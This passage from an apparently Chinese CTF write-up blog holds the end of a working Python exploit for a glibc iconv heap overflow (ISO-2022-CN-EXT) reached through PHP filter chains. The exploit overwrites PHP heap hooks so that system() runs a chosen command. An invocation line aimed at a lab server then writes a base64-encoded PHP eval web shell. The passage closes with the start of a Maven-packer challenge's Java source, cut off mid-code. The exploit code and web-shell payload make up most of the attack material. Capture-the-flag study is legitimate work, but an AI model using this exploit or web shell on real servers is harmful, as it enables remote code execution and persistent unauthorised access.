class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit_path</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        On each step of the exploit, a filter will process each chunk one after the</span><br><span class="hljs-string">        other. Processing generally involves making some kind of operation either</span><br><span class="hljs-string">        on the chunk or in a destination chunk of the same size. Each operation is</span><br><span class="hljs-string">        applied on every single chunk; you cannot make PHP apply iconv on the first 10</span><br><span class="hljs-string">        chunks and leave the rest in place. That&#x27;s where the difficulties come from.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Keep in mind that we know the address of the main heap, and the libraries.</span><br><span class="hljs-string">        ASLR/PIE do not matter here.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        The idea is to use the bug to make the freelist for chunks of size 0x100 point</span><br><span class="hljs-string">        lower. For instance, we have the following free list:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00</span><br><span class="hljs-string"></span><br><span class="hljs-string">        By triggering the bug from chunk ..900, we get:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???</span><br><span class="hljs-string"></span><br><span class="hljs-string">        That&#x27;s step 3.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Now, in order to control the free list, and make it point whereever we want,</span><br><span class="hljs-string">        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,</span><br><span class="hljs-string">        we&#x27;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.</span><br><span class="hljs-string">        That&#x27;s step 2.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Now, if we were to perform step2 an then step3 without anything else, we&#x27;d have</span><br><span class="hljs-string">        a problem: after step2 has been processed, the free list goes bottom-up, like:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900</span><br><span class="hljs-string"></span><br><span class="hljs-string">        We need to go the other way around. That&#x27;s why we have step 1: it just allocates</span><br><span class="hljs-string">        chunks. When they get freed, they reverse the free list. Now step2 allocates in</span><br><span class="hljs-string">        reverse order, and therefore after step2, chunks are in the correct order.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Another problem comes up.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.</span><br><span class="hljs-string">        Since step2 creates chunks that contain pointers and pointers are generally not</span><br><span class="hljs-string">        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.</span><br><span class="hljs-string">        To avoid this, we put the chunks in step2 at the very end of the chain, and</span><br><span class="hljs-string">        prefix them with `0\n`. When dechunked (right before the iconv), they will</span><br><span class="hljs-string">        &quot;disappear&quot; from the chain, preserving them from the character set conversion</span><br><span class="hljs-string">        and saving us from an unwanted processing error that would stop the processing</span><br><span class="hljs-string">        chain.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        After step3 we have a corrupted freelist with an arbitrary pointer into it. We</span><br><span class="hljs-string">        don&#x27;t know the precise layout of the heap, but we know that at the top of the</span><br><span class="hljs-string">        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.</span><br><span class="hljs-string">        Its free_slot[] array contains a pointer to each free list. By overwriting it,</span><br><span class="hljs-string">        we can make PHP allocate chunks whereever we want. In addition, its custom_heap</span><br><span class="hljs-string">        field contains pointers to hook functions for emalloc, efree, and erealloc</span><br><span class="hljs-string">        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and</span><br><span class="hljs-string">        then overwrite the use_custom_heap flag to make PHP use these function pointers</span><br><span class="hljs-string">        instead. We can now do our favorite CTF technique and get a call to</span><br><span class="hljs-string">        system(&lt;chunk&gt;).</span><br><span class="hljs-string">        We make sure that the &quot;system&quot; command kills the current process to avoid other</span><br><span class="hljs-string">        system() calls with random chunk data, leading to undefined behaviour.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the</span><br><span class="hljs-string">        process is in a random state, we still get contiguous, in order chunks for our</span><br><span class="hljs-string">        exploit.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Therefore, the whole process described here CANNOT crash. Everything falls</span><br><span class="hljs-string">        perfectly in place, and nothing can get in the middle of our allocations.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br><br>        LIBC = <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;libc&quot;</span>]<br><br>        ADDR_EFREE = LIBC.symbols[<span class="hljs-string">&quot;__libc_system&quot;</span>]<br>        ADDR_EREALLOC = LIBC.symbols[<span class="hljs-string">&quot;__libc_realloc&quot;</span>]<br>        ADDR_EMALLOC = LIBC.symbols[<span class="hljs-string">&quot;__libc_malloc&quot;</span>]<br><br>        ADDR_HEAP = <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;heap&quot;</span>]<br>        ADDR_FREE_SLOT = ADDR_HEAP + <span class="hljs-number">0x20</span><br>        ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="hljs-number">0x0168</span><br><br>        ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="hljs-number">0x10</span><br><br>        CS = <span class="hljs-number">0x100</span><br><br>        <span class="hljs-comment"># Pad needs to stay at size 0x100 at every step</span><br>        pad_size = CS - <span class="hljs-number">0x18</span><br>        pad = <span class="hljs-string">b&quot;\x00&quot;</span> * pad_size<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = compressed_bucket(pad)<br><br>        step1_size = <span class="hljs-number">1</span><br>        step1 = <span class="hljs-string">b&quot;\x00&quot;</span> * step1_size<br>        step1 = chunked_chunk(step1)<br>        step1 = chunked_chunk(step1)<br>        step1 = chunked_chunk(step1, CS)<br>        step1 = compressed_bucket(step1)<br><br>        <span class="hljs-comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span><br>        <span class="hljs-comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;</span><br><br>        step2_size = <span class="hljs-number">0x48</span><br>        step2 = <span class="hljs-string">b&quot;\x00&quot;</span> * (step2_size + <span class="hljs-number">8</span>)<br>        step2 = chunked_chunk(step2, CS)<br>        step2 = chunked_chunk(step2)<br>        step2 = compressed_bucket(step2)<br><br>        step2_write_ptr = <span class="hljs-string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="hljs-string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)<br>        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)<br>        step2_write_ptr = chunked_chunk(step2_write_ptr)<br>        step2_write_ptr = compressed_bucket(step2_write_ptr)<br><br>        step3_size = CS<br><br>        step3 = <span class="hljs-string">b&quot;\x00&quot;</span> * step3_size<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(step3) == CS<br>        step3 = chunked_chunk(step3)<br>        step3 = chunked_chunk(step3)<br>        step3 = chunked_chunk(step3)<br>        step3 = compressed_bucket(step3)<br><br>        step3_overflow = <span class="hljs-string">b&quot;\x00&quot;</span> * (step3_size - <span class="hljs-built_in">len</span>(BUG)) + BUG<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(step3_overflow) == CS<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = compressed_bucket(step3_overflow)<br><br>        step4_size = CS<br>        step4 = <span class="hljs-string">b&quot;=00&quot;</span> + <span class="hljs-string">b&quot;\x00&quot;</span> * (step4_size - <span class="hljs-number">1</span>)<br>        step4 = chunked_chunk(step4)<br>        step4 = chunked_chunk(step4)<br>        step4 = chunked_chunk(step4)<br>        step4 = compressed_bucket(step4)<br><br>        <span class="hljs-comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span><br>        <span class="hljs-comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span><br>        step4_pwn = ptr_bucket(<br>            <span class="hljs-number">0x200000</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-comment"># free_slot</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            ADDR_CUSTOM_HEAP,  <span class="hljs-comment"># 0x18</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            ADDR_HEAP,  <span class="hljs-comment"># 0x140</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            size=CS,<br>        )<br><br>        step4_custom_heap = ptr_bucket(<br>            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="hljs-number">0x18</span><br>        )<br><br>        step4_use_custom_heap_size = <span class="hljs-number">0x140</span><br><br>        COMMAND = <span class="hljs-variable language_">self</span>.command<br>        COMMAND = <span class="hljs-string">f&quot;kill -9 $PPID; <span class="hljs-subst">&#123;COMMAND&#125;</span>&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.sleep:<br>            COMMAND = <span class="hljs-string">f&quot;sleep <span class="hljs-subst">&#123;self.sleep&#125;</span>; <span class="hljs-subst">&#123;COMMAND&#125;</span>&quot;</span><br>        COMMAND = COMMAND.encode() + <span class="hljs-string">b&quot;\x00&quot;</span><br>        <span class="hljs-built_in">print</span>(COMMAND)<br>        <span class="hljs-keyword">assert</span> (<br>            <span class="hljs-built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size<br>        ), <span class="hljs-string">f&quot;Command too big (<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span><br>        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>        step4_use_custom_heap = COMMAND<br>        step4_use_custom_heap = qpe(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)<br><br>        pages = (<br>            step4 * <span class="hljs-number">3</span><br>            + step4_pwn<br>            + step4_custom_heap<br>            + step4_use_custom_heap<br>            + step3_overflow<br>            + pad * <span class="hljs-variable language_">self</span>.pad<br>            + step1 * <span class="hljs-number">3</span><br>            + step2_write_ptr<br>            + step2 * <span class="hljs-number">2</span><br>        )<br><br>        resource = compress(compress(pages))<br>        resource = b64(resource)<br>        resource = <span class="hljs-string">f&quot;data:text/plain;base64,<span class="hljs-subst">&#123;resource.decode()&#125;</span>&quot;</span><br><br>        filters = [<br>            <span class="hljs-comment"># Create buckets</span><br>            <span class="hljs-string">&quot;zlib.inflate&quot;</span>,<br>            <span class="hljs-string">&quot;zlib.inflate&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 0: Setup heap</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 1: Reverse FL order</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 2: Put fake pointer and make FL order back to normal</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 3: Trigger overflow</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span><br>            <span class="hljs-string">&quot;convert.quoted-printable-decode&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>        ]<br>        filters = <span class="hljs-string">&quot;|&quot;</span>.join(filters)<br>        path = <span class="hljs-string">f&quot;uri:php://filter/read=<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;resource&#125;</span>&quot;</span><br><br>        <span class="hljs-keyword">return</span> path<br><br><span class="hljs-meta">    @inform(<span class="hljs-params"><span class="hljs-string">&quot;Triggering...&quot;</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        path = <span class="hljs-variable language_">self</span>.build_exploit_path()<br>        start = time.time()<br>        <span class="hljs-built_in">print</span>(path)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-variable language_">self</span>.remote.send(path)<br>        <span class="hljs-keyword">except</span> (ConnectionError, ChunkedEncodingError):<br>            <span class="hljs-keyword">pass</span><br>        <br>        msg_print()<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.sleep:<br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;</span>)<br>        <span class="hljs-keyword">elif</span> start + <span class="hljs-variable language_">self</span>.sleep &lt;= time.time():<br><br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span><br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;</span>)<br>        <span class="hljs-comment">#print(1)</span><br>        msg_print()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">data</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># Remove 2-byte header and 4-byte checksum</span><br>    <span class="hljs-keyword">return</span> zlib.compress(data, <span class="hljs-number">9</span>)[<span class="hljs-number">2</span>:-<span class="hljs-number">4</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b64</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, misalign=<span class="hljs-literal">True</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    payload = base64.encode(data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> misalign <span class="hljs-keyword">and</span> payload.endswith(<span class="hljs-string">&quot;=&quot;</span>):<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;Misaligned: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload.encode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compressed_bucket</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> chunked_chunk(data, <span class="hljs-number">0x8000</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">qpe</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Emulates quoted-printable-encode.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-string">f&quot;=<span class="hljs-subst">&#123;x:02x&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data).upper().encode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ptr_bucket</span>(<span class="hljs-params">*ptrs, size=<span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> size <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(ptrs) * <span class="hljs-number">8</span> == size<br>    bucket = <span class="hljs-string">b&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(p64, ptrs))<br>    bucket = qpe(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = compressed_bucket(bucket)<br><br>    <span class="hljs-keyword">return</span> bucket<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">chunked_chunk</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, size: <span class="hljs-built_in">int</span> = <span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the</span><br><span class="hljs-string">    chunked representation has size `size`.</span><br><span class="hljs-string">    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># The caller does not care about the size: let&#x27;s just add 8, which is more than</span><br>    <span class="hljs-comment"># enough</span><br>    <span class="hljs-keyword">if</span> size <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        size = <span class="hljs-built_in">len</span>(data) + <span class="hljs-number">8</span><br>    keep = <span class="hljs-built_in">len</span>(data) + <span class="hljs-built_in">len</span>(<span class="hljs-string">b&quot;\n\n&quot;</span>)<br>    size = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="hljs-string">&quot;0&quot;</span>)<br>    <span class="hljs-keyword">return</span> size.encode() + <span class="hljs-string">b&quot;\n&quot;</span> + data + <span class="hljs-string">b&quot;\n&quot;</span><br><br><br><span class="hljs-meta">@dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Region</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span><br><br>    start: <span class="hljs-built_in">int</span><br>    stop: <span class="hljs-built_in">int</span><br>    permissions: <span class="hljs-built_in">str</span><br>    path: <span class="hljs-built_in">str</span><br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">size</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.stop - <span class="hljs-variable language_">self</span>.start<br><br><br>Exploit()<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python cnext-exploit.py http://30.222.0.20:59687/photo.php?pdoceshi <span class="hljs-string">&quot;echo PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php&quot;</span><br></code></pre></td></tr></table></figure><h1 id="maven-packer"><a href="#maven-packer" class="headerlink" title="maven-packer"></a>maven-packer</h1><p>JDK17。</p><p>hint: </p><ol><li>maven 插件 </li><li>关注 Dockerfile </li><li>题目本身禁止对外发起任何连接 </li><li>docker 国内镜像 registry.cn-hangzhou.aliyuncs.com&#x2F;exp10it&#x2F;maven-packer</li></ol><p>IndexController.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.exp10it.ctf;<br><br><span class="hljs-keyword">import</span> net.lingala.zip4j.ZipFile;<br><span class="hljs-keyword">import</span> net.lingala.zip4j.model.FileHeader;<br><span class="hljs-keyword">import</span> net.lingala.zip4j.model.UnzipParameters;<br><span class="hljs-keyword">import</span> net.lingala.zip4j.model.ZipParameters;<br><span class="hljs-keyword">import</span> org.springframework.http.*;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.util.FileSystemUtils;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><span class="hljs-keyword">import</span> org.springframework.web.multipart.MultipartFile;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">File</span> <span class="hljs-variable">UPLOADS</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/tmp/uploads&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">File</span> <span class="hljs-variable">PROJECTS</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/tmp/projects&quot;</span>);<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> ResponseEntity&lt;String&gt; <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>&lt;&gt;(<span class="hljs-string">&quot;Hello, World!&quot;</span>, HttpStatus.OK);<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/pack&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> ResponseEntity <span class="hljs-title function_">pack</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;file&quot;)</span> MultipartFile uploadFile)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        FileSystemUtils.deleteRecursively(UPLOADS);<br>        FileSystemUtils.deleteRecursively(PROJECTS);<br>        UPLOADS.mkdirs();<br>        PROJECTS.mkdirs();<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">projectFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(UPLOADS, String.format(<span class="hljs-string">&quot;%s.zip&quot;</span>, RandomUtil.randomStr(<span class="hljs-number">12</span>)));<br>        <span class="hljs-type">File</span> <span class="hljs-variable">projectDir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(PROJECTS, RandomUtil.randomStr(<span class="hljs-number">12</span>));<br>        uploadFile.transferTo(projectFile);<br><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ZipFile</span> <span class="hljs-variable">zipFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipFile</span>(projectFile)) &#123;<br>            <span class="hljs-type">UnzipParameters</span> <span class="hljs-variable">parameters</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnzipParameters</span>();<br>            parameters.setExtractSymbolicLinks(<span class="hljs-literal">false</span>);<br><br>            <span class="hljs-keyword">for</span> (FileHeader fileHeader : zipFile.getFileHeaders()) &#123;<br>                <span class="hljs-keyword">if</span> (!fileHeader.isDirectory()) &#123;<br>                    <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> zipFile.getInputStream(fileHeader)) &#123;<br>                        <span class="hljs-type">byte</span>[] data = input.readAllBytes();<br>                        <span class="hljs-keyword">if</span> (!Arrays.equals(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(data).getBytes(), data)) &#123;<br>                            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>&lt;&gt;(<span class="hljs-string">&quot;invalid zip file&quot;</span>, HttpStatus.OK);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            zipFile.extractAll(projectDir.getAbsolutePath(), parameters);<br>        &#125;<br><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;mvn&quot;</span>, <span class="hljs-string">&quot;package&quot;</span>, <span class="hljs-string">&quot;-Dmaven.test.skip=true&quot;</span>, <span class="hljs-string">&quot;--offline&quot;</span>)<br>                .directory(projectDir)<br>                .start()<br>                .waitFor();<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">targetDir</span> <span class="hljs-operator">=</span> Paths.get(projectDir.getAbsolutePath(), <span class="hljs-string">&quot;target&quot;</span>).toFile();<br>        <span class="hljs-keyword">if</span> (!targetDir.exists()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>&lt;&gt;(<span class="hljs-string">&quot;target dir not found&quot;</span>, HttpStatus.NOT_FOUND);<br>        &#125;<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">targetZipFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(projectDir, <span class="hljs-string">&quot;target.zip&quot;</span>);<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ZipFile</span> <span class="hljs-variable">zipFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipFile</span>(targetZipFile)) &#123;<br>            <span class="hljs-type">ZipParameters</span> <span class="hljs-variable">parameters</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipParameters</span>();<br>            parameters.setSymbolicLinkAction(ZipParameters.SymbolicLinkAction.INCLUDE_LINK_ONLY);<br>            zipFile.addFolder(targetDir);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>&lt;&gt;(Files.readAllBytes(Paths.get(targetZipFile.getAbsolutePath())), HttpStatus.OK);<br>    